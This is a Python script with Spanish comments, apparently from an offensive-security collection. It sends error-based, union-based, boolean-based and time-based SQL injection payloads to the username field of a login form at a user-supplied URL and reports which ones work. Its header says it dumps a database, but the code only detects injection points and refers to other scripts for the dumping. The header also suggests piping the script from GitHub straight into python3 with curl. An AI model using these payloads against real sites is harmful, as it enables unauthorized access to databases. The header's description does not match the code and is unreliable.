#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para usar error-based SQLi para dumpear una base de datos de una URL específica
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | python3 -
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | sed 's-sudo--g' | python3 -
#
# Ejecución remota con parámetros:
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | python3 - Parámetro1 Parámetro2
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/SQLi/ErrorBased-DumpearBaseDeDatos.py | nano -
# ----------

# Requisitos: # python3 -m pip install --user x --break-system-packages

import requests
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="URL vulnerable (por ejemplo: http://10.10.224.12/login)")
parser.add_argument("--delay", type=int, default=5, help="Delay para time-based SQLi (por defecto: 5 segundos)")
args = parser.parse_args()

url = args.url
delay = args.delay
success_word = "Bienvenido"  # Puedes cambiar esto si conoces el indicador de login exitoso

headers = {
  "User-Agent": "Mozilla/5.0",
  "Content-Type": "application/x-www-form-urlencoded"
}

def test_error_based():
  payload = "' AND updatexml(null,concat(0x7e,database(),0x7e),null) -- -"
  r = requests.post(url, data={"username": payload, "password": "x"}, headers=headers)
  return "XPATH syntax error" in r.text and "~" in r.text

def test_union_based():
  payload = "' UNION SELECT 1,database(),3 -- -"
  r = requests.post(url, data={"username": payload, "password": "x"}, headers=headers)
  return "information_schema" in r.text or "mysql" in r.text or "test" in r.text

def test_boolean_based():
  true_payload = "' AND 1=1 -- -"
  false_payload = "' AND 1=0 -- -"
  r_true = requests.post(url, data={"username": true_payload, "password": "x"}, headers=headers)
  r_false = requests.post(url, data={"username": false_payload, "password": "x"}, headers=headers)
  return (success_word in r_true.text) and (success_word not in r_false.text)

def test_time_based():
  payload = f"' AND IF(1=1, SLEEP({delay}), 0) -- -"
  t0 = time.time()
  requests.post(url, data={"username": payload, "password": "x"}, headers=headers)
  return time.time() - t0 >= delay - 0.5

print("\n Probando vectores de inyección...\n")

detected = []

if test_error_based():
  print(" Vulnerable a: Error-based (updatexml)")
  detected.append("error-based")

if test_union_based():
  print(" Vulnerable a: Union-based")
  detected.append("union-based")

if test_boolean_based():
  print(" Vulnerable a: Boolean-based")
  detected.append("boolean-based")

if test_time_based():
  print(" Vulnerable a: Time-based")
  detected.append("time-based")

if not detected:
  print(" No se detectaron vulnerabilidades SQLi comunes.")
else:
  print("\n➡ Puedes usar los scripts correspondientes para dumpear la base de datos:")
  for technique in detected:
    print(f"  - sqli_{technique.replace('-', '')}.py")
